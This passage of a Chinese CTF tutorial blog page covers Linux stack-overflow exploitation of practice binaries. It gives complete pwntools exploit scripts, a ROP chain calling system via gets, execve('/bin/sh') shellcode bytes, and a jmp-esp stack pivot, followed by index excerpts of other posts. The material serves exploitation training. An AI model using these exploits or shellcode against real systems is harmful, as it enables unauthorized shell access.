+<h2 id="第一步，保护情况，"><a href="#第一步，保护情况，" class="headerlink" title="第一步，保护情况，"></a>第一步，保护情况，</h2><p>发现堆栈不可以执行，其他到还好。那么，我们在溢出时就需要再堆栈中部署的具有功能的地址，而不是具体的代码了。理解成堆栈中需要布置路线图，之后的程序按照这个路线图来执行。<br>反之，如果堆栈可以执行，我们就要思考如何布置shellcode，如何优化shellcode长度以及删除坏字符。（将在下一题的时候介绍）<br><img src="https://p0.ssl.qhimg.com/t01f8b5bc18e39f93c7.png" alt=""></p>
+<h2 id="第二步，检测漏洞函数。"><a href="#第二步，检测漏洞函数。" class="headerlink" title="第二步，检测漏洞函数。"></a>第二步，检测漏洞函数。</h2><p>发现是gets。这里分享一个ctf-pwn-tips，里面总结了很多的存在漏洞的函数，以及输入参数的描述，非常实用。<a href="https://github.com/Naetw/CTF-pwn-tips" target="_blank" rel="noopener">TIPS</a></p>
+<p><img src="https://p1.ssl.qhimg.com/t014d94fc90e8ce8cea.png" alt=""></p>
+<h2 id="第三步，确认偏移量。"><a href="#第三步，确认偏移量。" class="headerlink" title="第三步，确认偏移量。"></a>第三步，确认偏移量。</h2><p>有几种方式。</p>
+<p><img src="https://p0.ssl.qhimg.com/t0167c02bcc6dbf90e6.png" alt=""></p>
+<p>我们可以直接从IDA的代码中分析出来，参数距离EBP的位置。如上述，看到距离ebp是0x64（100）个的字节，那么距离存放返回地址的偏移就是100+4=104个字节。但是，IDA的分析并不都是准确的，真正准确的位置，还是需要我们手动去调试。具体方法参考<a href="https://www.anquanke.com/post/id/164530" target="_blank" rel="noopener">Linux PWN从入门到熟练</a>。这里简单整理一下步骤（假设linux程序在虚拟机guest执行，IDA在主机host执行）：</p>
+<ol>
+<li>拷贝linux_server到guest的程序目录，并执行；</li>
+<li>IDA设置远程调试，并设置正确的guest IP和端口；</li>
+<li>IDA设置程序的断点在return，可以方便查看寄存器；</li>
+<li>运行程序；</li>
+<li>用脚本patternLocOffset.py创建偏移测试字符串，700字节度比如；</li>
+<li>将产生的字符串在guest中输入；</li>
+<li>查看host中IDA的ebp字符串；</li>
+<li>在patternLocOffset.py中计算偏移</li>
+</ol>
+<p>最终应该可以看到下面类似的结果。</p>
+<p><img src="https://p4.ssl.qhimg.com/t017968c196596776d0.png" alt=""></p>
+<pre><code>$ python patternLocOffset.py -l 700 -s 0x41366441
+[*] Create pattern string contains 700 characters ok!
+[*] No exact matches, looking for likely candidates...
+[+] Possible match at offset 108 (adjusted another-endian)
+[+] take time: 0.0004 s
+</code></pre><p>发现实际的偏移是108个字节，覆盖点距离ebp。那么距离返回地址就应该是108+4=112字节。可见，IDA的分析有时是不准的，需要自己去测量。</p>
+<h2 id="第四步，分析可以利用的函数，"><a href="#第四步，分析可以利用的函数，" class="headerlink" title="第四步，分析可以利用的函数，"></a>第四步，分析可以利用的函数，</h2><p>发现有system的：<br><img src="https://p4.ssl.qhimg.com/t01288ba56dd36b995f.png" alt=""></p>
+<h2 id="第五步-查找是否有系统调用字符串："><a href="#第五步-查找是否有系统调用字符串：" class="headerlink" title="第五步,查找是否有系统调用字符串："></a>第五步,查找是否有系统调用字符串：</h2><pre><code>ROPgadget --binary ret2libc2 --string &quot;/bin/sh&quot;
+Strings information
+============================================================
+</code></pre><p>发现并没有字符串了，因此这里我们需要想个办法。<br>直观的想法是在shellcode中，在参数的位置直接放入字符串“/bin/sh”，比如下面这样：</p>
+<pre><code>payload = flat([&#39;a&#39; * 112, system_plt, 0xabcdabcd, “/bin/sh”])
+</code></pre><p>但是正如我们前面所说，放在堆栈中的是程序执行的路线图，而不是实际的程序或者字符串，因此，按照上述方式放置字符串，system并不会读取”/bin/sh”，而是读取”/bin/sh”对应的4个字节的地址所指向的内存空间，这个空间明显是不合法，因此就会导致利用失败。</p>
+<p>怎么办呢？我们发现程序中还载入了函数gets，那么我们可以利用gets来读取用户输入的”/bin/sh”放置到某个地址空间去，接着system再调用它。“某个地址空间”可以是下面的buf2，可以发现它的地址是0x0804A080。这个空间可以让我们使用（感觉明显是CTF题留出来的位置= =）<br><img src="https://p5.ssl.qhimg.com/t017a6718f692b766fa.png" alt=""></p>
+<p>那么，我们的exp可以按照下面的方式安排：</p>
+<pre><code>##!/usr/bin/env python
+from pwn import *
+
+sh = process(&#39;./pwn4&#39;)
+shelf = ELF(&#39;./pwn4&#39;)
+
+gets_plt = shelf.plt[&#39;gets&#39;]
+system_plt = shelf.plt[&#39;system&#39;]
+pop_ebp = 0x0804872f
+buf2 = 0x804a080
+payload = flat(
+[&#39;a&#39; * 112, gets_plt, pop_ebp, buf2, system_plt, 0xabcdabcd, buf2])
+
+sh.sendline(payload)
+sh.sendline(&#39;/bin/sh&#39;)
+sh.interactive()
+</code></pre><p>其中关键的代码是：</p>
+<pre><code>payload = flat(
+[&#39;a&#39; * 112, gets_plt, pop_ebp, buf2, system_plt, 0xabcdabcd, buf2])
+</code></pre><p>相信有的朋友会不明白，为啥有个[gets_plt, pop_ebp, buf2]，这样的payload布置。Pop_ebp的主要目的是让eip流向system的位置，并且取出system地址赋值给eip。</p>
+<p>Pop_ebp其实不一定是pop ebp，pop任何其他的寄存器都可以，主要是利用该指令的esp+4的功能。比如，我们可以找到如下的位置，其中0x0804872f，0x0804843d都可以让它esp+4操作一次就好，操作多了就流的多了，就不指向system地址了，注意我们这里还要求得要返回ret一下，这样才会实际的提取system的地址出来，赋值给eip：</p>
+<pre><code>@ubuntu:~/ $ ROPgadget --binary pwn4 --only &#39;pop|ret&#39;
+Gadgets information
+============================================================
+0x0804872f : pop ebp ; ret
+0x0804872c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
+0x0804843d : pop ebx ; ret
+0x0804872e : pop edi ; pop ebp ; ret
+0x0804872d : pop esi ; pop edi ; pop ebp ; ret
+0x08048426 : ret
+0x0804857e : ret 0xeac1
+
+Unique gadgets found: 7
+</code></pre><p>未来更清楚一些，画了一个图，其中序号的顺序表示，对应的命令执行完之后，esp对应的位置。</p>
+<p><img src="https://p1.ssl.qhimg.com/t018a4afb837304a376.png" alt=""></p>
+<h1 id="第一题（堆栈直接执行shellcode）"><a href="#第一题（堆栈直接执行shellcode）" class="headerlink" title="第一题（堆栈直接执行shellcode）"></a>第一题（堆栈直接执行shellcode）</h1><p>接下来这题，我们再轻松一点，可以直接在堆栈中执行程序。</p>
+<p><a href="https://github.com/desword/pwn_execrise/raw/master/pwn_basic_rop_2/ pwn5" target="_blank" rel="noopener">pwn5</a></p>
+<p>继续前面的套路。</p>
+<h2 id="第一步，查看保护"><a href="#第一步，查看保护" class="headerlink" title="第一步，查看保护"></a>第一步，查看保护</h2><p><img src="https://p2.ssl.qhimg.com/t016b308f80ec6901b4.png" alt=""><br>发现，可以直接在堆栈上执行程序了，开启的是PIE，地址随机化的保护。</p>
+<h2 id="第二步，判断漏洞函数。"><a href="#第二步，判断漏洞函数。" class="headerlink" title="第二步，判断漏洞函数。"></a>第二步，判断漏洞函数。</h2><p><img src="https://p1.ssl.qhimg.com/t01056910f70d292495.png" alt=""></p>
+<p>发现函数是read，仅仅读取0x40（64）个字节。</p>
+<h2 id="第三步，计算目标变量的在堆栈中距离ebp的偏移"><a href="#第三步，计算目标变量的在堆栈中距离ebp的偏移" class="headerlink" title="第三步，计算目标变量的在堆栈中距离ebp的偏移"></a>第三步，计算目标变量的在堆栈中距离ebp的偏移</h2><p><img src="https://p2.ssl.qhimg.com/t0114aaf4e471689ae0.png" alt=""><br>EBP的内容为：0x3761413661413561</p>
+<pre><code>$ python patternLocOffset.py -l 700 -s 0x3761413661413561
+[*] Create pattern string contains 700 characters ok!
+[*] No exact matches, looking for likely candidates...
+[+] Possible match at offset 16 (adjusted another-endian)
+[+] take time: 0.0005 s
+</code></pre><p>距离EBP的偏移是16个字节，距离存放的返回地址是16+8=24个字节。<br>这里可以发现IDA分析的又是正确的了，0x10个字节。</p>
+<h2 id="第四步和第五步，分析是否已经载入了可以利用的函数，"><a href="#第四步和第五步，分析是否已经载入了可以利用的函数，" class="headerlink" title="第四步和第五步，分析是否已经载入了可以利用的函数，"></a>第四步和第五步，分析是否已经载入了可以利用的函数，</h2><p>如system，execve等<br>发现，并没有上述函数。但是由于堆栈可以执行，因此我们可以考虑直接将shellcode阻止在payload里面。因此，这里和第五步分析是否有字符串/bin/sh合并了，我们可以自己放置字符串，并且调用对应的地址了。<br><img src="https://p2.ssl.qhimg.com/t01360d2ba3379b64b1.png" alt=""></p>
+<p>理论上，我们可以直接利用pwntools产生的shellcode来进行部署，但是这道题有点特殊。在返回地址之后所剩余的空间=64-24-8=32个字节（返回地址还要占用8个字节），因此实际部署shellcode的长度还剩下32个字节，使用pwntools产生的shellcode有44个字节，太长了。因此，我们可以从网上找到更短的shellcode：</p>
+<pre><code># 23 bytes
+# https://www.exploit-db.com/exploits/36858/
+shellcode_x64 = &quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;
+</code></pre><p>它的汇编形式是</p>
+<pre><code># char *const argv[]
+xorl %esi, %esi
+# &#39;h&#39; &#39;s&#39; &#39;/&#39; &#39;/&#39; &#39;n&#39; &#39;i&#39; &#39;b&#39; &#39;/&#39;
+movq $0x68732f2f6e69622f, %rbx
+# for &#39;\x00&#39;
+pushq %rsi
+pushq %rbx
+pushq %rsp
+# const char *filename
+popq %rdi
+# __NR_execve 59
+pushq $59
+popq %rax
+# char *const envp[]
+xorl %edx, %edx
+syscall
+</code></pre><p>好了，shellcode确定好了，我们现在还有一个问题。Shellcode执行的地址如何确定呢？shellcode的地址，其实就是buf的地址加上32个字节的偏移。</p>
+<p>我们前面发现，该程序是动态改变地址的，因此静态的确认buf地址是不可行的，进而静态的确认shellcode的地址是不可行的。<br>处理到这里好像有点死胡同了，我们发现程序中有printf函数，理论上可以利用它来打印buf的地址，然后实时的计算buf+32的地址，就能够得到shellcode的地址。但是，我们回头看看程序本身的执行，会发现：<br><img src="https://p1.ssl.qhimg.com/t019698e0c6c9cf851f.png" alt=""></p>
+<p><img src="https://p3.ssl.qhimg.com/t01b62400cb53319c0a.png" alt=""></p>
+<p>它实际上已经为我们解决了这个问题，自己输出了buf的地址（= = CTF题目的难易程度真的是微妙之间呀）</p>
+<p>那么，我们的exp思路就是： 实时读取buf的地址，计算buf+32得到shellcode的地址，放置在payload中。</p>
+<pre><code>from pwn import *
+code = ELF(&#39;./pwn5&#39;)
+
+# 23 bytes
+# https://www.exploit-db.com/exploits/36858/
+shellcode_x64 = &quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;
+sh.recvuntil(&#39;[&#39;)
+buf_addr = sh.recvuntil(&#39;]&#39;, drop=True)
+buf_addr = int(buf_addr, 16)
+payload = &#39;b&#39; * 24 + p64(buf_addr + 32) + shellcode_x64
+sh.sendline(payload)
+sh.interactive()
+</code></pre><p>堆栈的布置图，以及地址的相对位置，以buf为起点。</p>
+<p><img src="https://p1.ssl.qhimg.com/t01e0f313dd79878e65.png" alt=""></p>
+<h1 id="第二题（控制esp进行精准打击）"><a href="#第二题（控制esp进行精准打击）" class="headerlink" title="第二题（控制esp进行精准打击）"></a>第二题（控制esp进行精准打击）</h1><p>接下来，我们来点有难度的。在这个程序中，我们的payload实在放不下了，即使是23字节，那么怎么办呢？</p>
+<p><a href="https://github.com/desword/pwn_execrise/raw/master/pwn_basic_rop_2/pwn6" target="_blank" rel="noopener">pwn6</a></p>
+<p>继续前面的过程：</p>
+<h2 id="第一步：检测保护情况"><a href="#第一步：检测保护情况" class="headerlink" title="第一步：检测保护情况"></a>第一步：检测保护情况</h2><p><img src="https://p1.ssl.qhimg.com/t016ededdc1521f063d.png" alt=""><br>发现，是个三无程序。么有任何保护，看起来很简单？哈哈，并没有。看官请继续。</p>
+<h2 id="第二步，判断漏洞函数，"><a href="#第二步，判断漏洞函数，" class="headerlink" title="第二步，判断漏洞函数，"></a>第二步，判断漏洞函数，</h2><p>如gets,scanf等</p>
+<p><img src="https://p5.ssl.qhimg.com/t01e2b7c1e1f2074dd7.png" alt=""></p>
+<p>发现是fgets函数，仅仅读取50个字节的字符长度。</p>
+<h2 id="第三步，"><a href="#第三步，" class="headerlink" title="第三步，"></a>第三步，</h2><p>计算目标变量的在堆栈中距离ebp的偏移。<br>方法和前面类似，发现偏移距离ebp是0x20，那么距离ret_addr就是0x20+4=0x24（36）字节了。</p>
+<h2 id="第四步和第五步："><a href="#第四步和第五步：" class="headerlink" title="第四步和第五步："></a>第四步和第五步：</h2><p>分析是否已经载入了可以利用的函数。发现并没有<br><img src="https://p3.ssl.qhimg.com/t011d3d70f9f4613bf3.png" alt=""></p>
+<pre><code>$ ROPgadget --binary stack_pivoting_1 --string &#39;/bin/sh&#39;
+Strings information
+============================================================
+</code></pre><p>字符串自然也是没有的。<br>我们考虑利用shellcode，好像可以类似于上一题的操作了。但是并不能，留给我们布置shellcode的长度为50-36-4=10字节（同样有4个字节的返回地址存放）！尴尬不==，放两个地址就没有位置了。但如果你能够厉害到用10个字节做shellcode，请大胆分享出来！</p>
+<p>那么怎么办呢？<br>既然，堆栈溢出的位置不行了，那么我们就把shellcode放在栈里面吧！因为堆栈具有可执行的权限，因此这样完全是可行的。</p>
+<p>这里，我先放图出来解释一下思路：</p>
+<p><img src="https://p2.ssl.qhimg.com/t01175d7da88713df4b.png" alt=""></p>
+<p>我们这样就总共有0x20（36个字节）的位置存放shellcode的了，顿时感觉找到了新出路。但是，要做到跳转到放置shellcode的位置，似乎并没有那么简单。要达到这个目的，我们需要做到以下几件事情：</p>
+<ol>
+<li>推算shellcode放置的地址</li>
+<li>跳转到shellcode放置的位置</li>
+</ol>
+<p>首先，第一点，shellcode的位置就是发射payload的时候esp_old的位置，我们可以推算出来，当程序提取完返回地址之后，esp指向的地址距离esp_old的地址为0x20+4(ebp)+4(ret_addr)=0x28。因此，我们需要用当前的esp-0x28，得到的就是shellcode的地址。</p>
+<p>对于第二点，我们如何让eip顺利的依次取出我们设计好的路线图呢？在ret_addr，我们需要寻找到一个gadget，它能够跳转到esp的位置，以继续往后执行栈上的代码。注意，这里我们为什么不直接将可执行的代码布置在ret_addr的位置，因为这里是原本的函数提取返回函数地址的地方，它并不会执行这里位置的代码，而是执行这个位置的内容指向的地址的代码。我们需要jmp esp这个操作，来让程序流获得在栈上执行的先河。</p>
+<pre><code>$ ROPgadget --binary stack_pivoting_1 --only &#39;jmp|ret&#39; | grep &#39;esp&#39;
+0x08048504 : jmp esp
+</code></pre><p>发现只有这么一个地址。0x08048504。这也正是图中的位置。注意，当我们取出ret_addr里面的地址的时候，esp已经+4了，因此就会指向我们的下一步操作：跳转回esp_old的位置。</p>
+<p>在这里，我们直接可以选择让pwntools产生可执行的代码”sub  esp 0x28; jmp esp”。注意，这里可以是直接运行的代码，因为我们的程序已经开始在栈上执行了，而不再是取出地址了。</p>
+<p>最后的EXP按照下面这样布置：</p>
+<pre><code>from pwn import *
+
+sh = process(&#39;./pwn6&#39;)
+
+shellcode_x86 = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;
+shellcode_x86 += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;
+shellcode_x86 += &quot;\x0b\xcd\x80&quot;
+
+sub_esp_jmp = asm(&#39;sub esp, 0x28;jmp esp&#39;)
+jmp_esp = 0x08048504
+payload = shellcode_x86 + (
+    0x20 - len(shellcode_x86)) * &#39;b&#39; + &#39;bbbb&#39; + p32(jmp_esp) + sub_esp_jmp
+sh.sendline(payload)
+sh.interactive()
+</code></pre><p>注意，这里我们又启用了另外一段代码：<br>它更加短，只有21个字节。Shellcode越短是越好的。它的汇编对应如下：</p>
+<pre><code>shellcode_x86 = &quot;\x31\xc9”                  # xor    ecx, ecx
+shellcode_x86 += “\xf7\xe1”            # mul    ecx
+shellcode_x86 += “\x51”            # push   ecx
+shellcode_x86 += &quot;\x68\x2f\x2f\x73\x68&quot;  # push 0x68732f2f
+shellcode_x86 += &quot;\x68\x2f\x62\x69\x6e&quot;  # push 0x6e69622f    
+shellcode_x86 += “\x89\xe3”            # mov    ebx, esp
+shellcode_x86 += “\xb0\x0b”            # mov    al, 0xb
+shellcode_x86 += &quot;\xcd\x80&quot;        # int    0x80
+</code></pre><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>最后，再次给大家留下练习题。<br><a href="https://github.com/desword/pwn_execrise/raw/master/pwn_basic_rop_2/pwn7" target="_blank" rel="noopener">pwn7</a></p>
+<p>给大家一个小tips，32位和64位程序的调试，一般的处理方式是准备两个虚拟机。但是这样操作太麻烦了，而且pwntools在32位下面经常无法正常工作。怎么办呢？理论上64位ubuntu是可以运行32位程序的，但是需要相关的库函数安装。使用下面的命令安装就好（<a href="https://blog.csdn.net/kingroc/article/details/51143327" target="_blank" rel="noopener">参考</a>）：</p>
+<pre><code>sudo dpkg --add-architecture i386
+sudo apt-get update
+sudo apt-get install zlib1g:i386 libstdc++6:i386 libc6:i386
+</code></pre><p>如果是比较老的版本，可以用下面的命令：</p>
+<pre><code>sudo apt-get install ia32-libs
+</code></pre><p>本文首发于安全客：<a href="https://www.anquanke.com/post/id/168468" target="_blank" rel="noopener">https://www.anquanke.com/post/id/168468</a></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux-pwn/">linux-pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ret2libc/">ret2libc</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/stack-pivoting/">stack pivoting</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+<!-- for valine comment-->
+
+    <div id="comment"></div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+new Valine({
+    el: '#comment' ,
+    notify:false, 
+    verify:false, 
+    appId: '5ThDnxJ9xGDRyj5a8Kq8apby-gzGzoHsz',
+    appKey: 'SmwcB7E7gWXRWaBth0Em9cV8',
+    placeholder: "One comment, many ideas.",
+    avatar:"retro"
+});
+</script>
+
+    
+
+
+
+
+
+
+
+
+  
+    <article id="post-linx-pwn-basic-rop" class="article article-type-post" itemscope="" itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/11/18/linx-pwn-basic-rop/" class="article-date">
+      <time datetime="2018-11-17T18:56:32.000Z" itemprop="datePublished">2018-11-18</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/11/18/linx-pwn-basic-rop/">Linux PWN从入门到熟练</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+              <p><img src="https://p0.ssl.qhimg.com/t01a969a8d998ad5508.png" alt=""></p>
+<p>最近在复习pwn的一些知识。主要涉及到当堆栈开启了保护的时候，我们不能够直接将shellcode覆盖到堆栈中执行，而需要利用程序其他部分的可执行的小片段来连接成最终的shellcode。此小片段就是gadgets。本文主要通过练习题的方式讲述如何寻找gadgets，如何利用现有的工具来加速自己的pwn的效率。Gadgets的类型和难度也逐步变化。下面带来手把手教你linux pwn。让你的pwn技术从入门到熟练。练习题的难度逐步加大。</p>
+          
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux-pwn/">linux-pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ret2libc/">ret2libc</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ret2shellcode/">ret2shellcode</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ret2syscall/">ret2syscall</a></li></ul>
+    </div>
+
+      
+        <p class="article-more-link">
+          <a href="/2018/11/18/linx-pwn-basic-rop/#more">more >></a>
+        </p>
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+<!-- for valine comment-->
+
+    <div id="comment"></div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+new Valine({
+    el: '#comment' ,
+    notify:false, 
+    verify:false, 
+    appId: '5ThDnxJ9xGDRyj5a8Kq8apby-gzGzoHsz',
+    appKey: 'SmwcB7E7gWXRWaBth0Em9cV8',
+    placeholder: "One comment, many ideas.",
+    avatar:"retro"
+});
+</script>
+
+    
+
+
+
+
+
+
+
+
+  
+    <article id="post-cc2650-mqtt-client-example" class="article article-type-post" itemscope="" itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/11/03/cc2650-mqtt-client-example/" class="article-date">
+      <time datetime="2018-11-02T22:24:13.000Z" itemprop="datePublished">2018-11-03</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/11/03/cc2650-mqtt-client-example/">CC2650 launchpad + RPI + CC2650 sensor tag 构造MQTT控制蓝牙节点</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+              <p>经过一番折腾，总算跑通了MQTT控制蓝牙节点的程序。目前来说，基于6lbr的这个服务来控制蓝牙节点还存在问题，也有可能是cc26x0-web-demo这个样例程序本身的问题。但是不管如何，我的当前的目标就是通过MQTT来控制蓝牙节点，这个目的算法达成了。但是cc26x0-web-demo为什么没有成功，只能留到以后再解决了。</p>
+          
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/MQTT/">MQTT</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/RPI/">RPI</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ZigBee-control/">ZigBee control</a></li></ul>
+    </div>
+
+      
+        <p class="article-more-link">
+          <a href="/2018/11/03/cc2650-mqtt-client-example/#more">more >></a>
+        </p>
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+<!-- for valine comment-->
+
+    <div id="comment"></div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+new Valine({
+    el: '#comment' ,
+    notify:false, 
+    verify:false, 
+    appId: '5ThDnxJ9xGDRyj5a8Kq8apby-gzGzoHsz',
+    appKey: 'SmwcB7E7gWXRWaBth0Em9cV8',
+    placeholder: "One comment, many ideas.",
+    avatar:"retro"
+});
+</script>
+
+    
+
+
+
+
+
+
+
+
+  
+    <article id="post-fuzzer_simple_survey" class="article article-type-post" itemscope="" itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/11/01/fuzzer_simple_survey/" class="article-date">
+      <time datetime="2018-11-01T02:43:54.000Z" itemprop="datePublished">2018-11-01</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/11/01/fuzzer_simple_survey/">漏洞挖掘之乱拳打死老师傅——Fuzzer</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+              <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>Fuzzer是一种通过产生一系列非法的、非预期的或者随机的输入向量给目标程序，从而完成自动化的触发和挖掘目标程序中的安全漏洞的软件测试技术。相比于形式化的软件漏洞测试技术（比如，<a href="https://www.anquanke.com/post/id/157928" target="_blank" rel="noopener">符号执行技术</a> ），Fuzzer往往能够在实际的应用中挖掘更多的漏洞。形式化的漏洞挖掘技术的优势在于其不需要实际执行程序，然而在处理程序底层的某些操作（比如函数的虚指针）时，现有的符号执行技术往往不能做到精准的分析。因此，这两种技术在实际的应用中各有优劣。</p>
+          
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/AFL/">AFL</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/T-Fuzz/">T-Fuzz</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/fuzzer/">fuzzer</a></li></ul>
+    </div>
+
+      
+        <p class="article-more-link">
+          <a href="/2018/11/01/fuzzer_simple_survey/#more">more >></a>
+        </p>
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+<!-- for valine comment-->
+
+    <div id="comment"></div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+new Valine({
+    el: '#comment' ,
+    notify:false, 
+    verify:false, 
+    appId: '5ThDnxJ9xGDRyj5a8Kq8apby-gzGzoHsz',
+    appKey: 'SmwcB7E7gWXRWaBth0Em9cV8',
+    placeholder: "One comment, many ideas.",
+    avatar:"retro"
+});
+</script>
+
+    
+
+
+
+
+
+
+
+
+  
+  
+</div>
       <footer id="footer">
     <div class="outer">
 
